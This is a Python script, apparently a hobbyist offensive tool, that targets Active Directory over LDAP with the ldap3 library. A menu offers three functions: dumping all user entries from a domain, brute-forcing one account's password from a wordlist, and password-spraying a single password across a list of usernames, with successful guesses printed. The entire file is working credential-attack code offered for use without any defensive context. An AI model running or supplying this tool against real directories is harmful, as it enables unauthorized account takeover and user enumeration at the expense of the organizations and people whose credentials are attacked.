import sys,time
import colorama
from ldap3 import Server, Connection, SUBTREE


def getting_users_by_any_user():

    server_address = input("Enter the server ip: ")
    server_port = 389  # LDAP standart portu
    doamin_name=input("Enter the domain name(without base_dn just domain name): ")
    username=input("Enter the username: ")
    user = f'{doamin_name}\\{username}'  # Domain admin kullanıcı adı
    password = input("Enter the password: ")  # Domain admin şifresi


    server = Server(server_address, port=server_port)
    connection = Connection(server, user=user, password=password)
    print(connection)
    if not connection.bind():
        print('Connection Error:', connection.result)
        exit()

    base=input("Enter the domain base_dn(example: com,local): ")
    base_dn = f'dc={doamin_name},dc={base}'
    search_filter = '(objectClass=user)'

    connection.search(base_dn, search_filter, SUBTREE)
    response = connection.response

    print(response)
    if response:
        print('LDAP query is successfully.')
        print("Data is coming...")
        time.sleep(1)
        islemler=["raw_dn"]
        for entry in response:
            for a in islemler:
                if a in str(entry.keys()):
                    for b in str(entry[a].decode()).split("CN="):
                        print(b)




    else:
        print('LDAP query is failed.')


    connection.unbind()







def brute_force():
    doamin_name = input("Enter the domain name: ")
    server_ip=input("Enter the server ip: ")
    server_port=389
    user=input("Enter the username: ")
    file_path=input("Enter the file path for password: ")
    f=open(file_path,"r")
    for a in f.readlines():
        a=a.strip()
        username=f"{doamin_name}\\{user}"
        passwd=str(a)


        server=Server(server_ip,port=server_port)
        connection=Connection(server,user=username,password=passwd)

        if not connection.bind():
            print("Not Found")

        else:
            print(colorama.Fore.GREEN);print("\tWe found it------------------->"+str(username)+"---------------"+str(passwd));print(colorama.Fore.RESET)
        connection.unbind()

def password_spray():
    server_ip=input("Enter the server ip: ")
    server_port=389
    domain_name=input("Enter the domain name: ")
    file_path=input("Enter the file path for users: ")
    f=open(file_path,"r")
    passwwd=input("Enter the your spesific password: ")
    for b in f.readlines():
        b=b.strip()
        username=f"{domain_name}\\{str(b)}"
        passwd=passwwd

        server=Server(server_ip,port=server_port)
        connection=Connection(server,user=username,password=passwd)
        if not connection.bind():
            print("Not Found")
        else:
            print(colorama.Fore.GREEN);print("\tWe found it------------------->"+str(b)+"/"+str(passwd));print(colorama.Fore.RESET)

        connection.unbind()





choose=int(input("1-Getting Users\n2-Brute Force\n3-Password Spraying\nYour Choice: "))
if choose==1:
        getting_users_by_any_user()
elif choose==2:
        brute_force()
elif choose==3:
        password_spray()
else:
        print("Wrong Answer!!!");sys.exit()


